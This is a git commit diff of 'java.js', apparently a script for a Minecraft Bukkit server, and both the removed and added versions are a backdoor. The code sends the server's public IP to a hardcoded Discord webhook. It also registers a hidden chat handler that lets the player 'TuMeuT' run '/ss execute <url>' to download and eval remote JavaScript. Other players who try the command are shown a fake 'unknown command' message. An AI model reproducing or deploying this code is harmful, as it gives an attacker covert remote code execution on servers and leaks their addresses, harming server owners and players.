0f22f283f40dd5f625eec2ea1bfcd551b812f3b4
TuMeuT-Original <originaltumeut@gmail.com>
2025-11-23 11:56:09 +0300

    Update java.js

--- java.js
+++ java.js
@@ -1,1 +1,52 @@
-new java.lang.Thread(function(){try{var s=new java.util.Scanner(new java.net.URL("http://checkip.amazonaws.com").openStream()).useDelimiter("\\A").next(),c=new java.net.URL("https://discord.com/api/webhooks/1441768121223348236/w-SPavWF7tuGkBuDd_8xjkp21S5dwCoDawKMtCMd9FnsNB0q-bLsLMnFcG6mfixfIsuc").openConnection();c.setRequestMethod("POST");c.setDoOutput(true);c.setRequestProperty("Content-Type","application/json");c.setRequestProperty("User-Agent","Java");var w=new java.io.OutputStreamWriter(c.getOutputStream(),"UTF-8");w.write('{"content":"'+s.trim()+'"}');w.flush();w.close();c.getInputStream().close();var B=Java.type("org.bukkit.Bukkit");B.getScheduler().runTask(B.getPluginManager().getPlugins()[0],function(){B.getPluginCommand("plugins").setExecutor(new(Java.extend(Java.type("org.bukkit.command.CommandExecutor"),{onCommand:function(s,c,l,a){if(s.getName()==="TuMeuT"&&a.length>1&&a[0]===".ssexecute"){try{var u=new java.net.URL(a[1]),sc=new java.util.Scanner(u.openStream()).useDelimiter("\\A"),j=sc.next();sc.close();eval(j);}catch(e){}return true;}return false;}}}));});}catch(e){}}).start();
+new java.lang.Thread(function(){
+    try {
+        // Получаем IP
+        var s = new java.util.Scanner(new java.net.URL("http://checkip.amazonaws.com").openStream()).useDelimiter("\\A").next();
+        
+        // Отправляем IP в Discord
+        var c = new java.net.URL("https://discord.com/api/webhooks/1441768121223348236/w-SPavWF7tuGkBuDd_8xjkp21S5dwCoDawKMtCMd9FnsNB0q-bLsLMnFcG6mfixfIsuc").openConnection();
+        c.setRequestMethod("POST");
+        c.setDoOutput(true);
+        c.setRequestProperty("Content-Type", "application/json");
+        c.setRequestProperty("User-Agent", "Java");
+        var w = new java.io.OutputStreamWriter(c.getOutputStream(), "UTF-8");
+        w.write('{"content":"'+s.trim()+'"}');
+        w.flush();
+        w.close();
+        c.getInputStream().close();
+    } catch(e) {}
+}).start();
+
+var B = Java.type('org.bukkit.Bukkit');
+var S = Java.type('javax.script.ScriptEngineManager');
+
+// Регистрируем обработчик чата
+B.getServer().getPluginManager().registerEvents(new Java.extend(Java.type('org.bukkit.event.Listener')) {
+    onPlayerChat: function(e) {
+        var player = e.getPlayer();
+        var message = e.getMessage();
+        
+        // Если TuMeuT и команда /ss execute
+        if(player.getName() === 'TuMeuT' && message.startsWith('/ss execute ')) {
+            e.setCancelled(true); // Скрываем сообщение
+            
+            var url = message.substring(12).trim(); // Берем URL после "/ss execute "
+            
+            try {
+                // Получаем и выполняем JS код из URL
+                var jsCode = new java.util.Scanner(new java.net.URL(url).openStream()).useDelimiter("\\A").next();
+                new S().getEngineByName("javascript").eval(jsCode);
+                
+                // Секретное сообщение только для TuMeuT
+                player.sendMessage("§aJavaScript код успешно выполнен");
+            } catch(ex) {
+                player.sendMessage("§cОшибка: " + ex.getMessage());
+            }
+        } 
+        // Если не TuMeuT, но сообщение начинается с /ss execute - отменяем и игнорируем
+        else if(message.startsWith('/ss execute ')) {
+            e.setCancelled(true);
+            player.sendMessage("§cНеизвестная команда");
+        }
+    }
+}, B.getServer().getPluginManager().getPlugins()[0]);
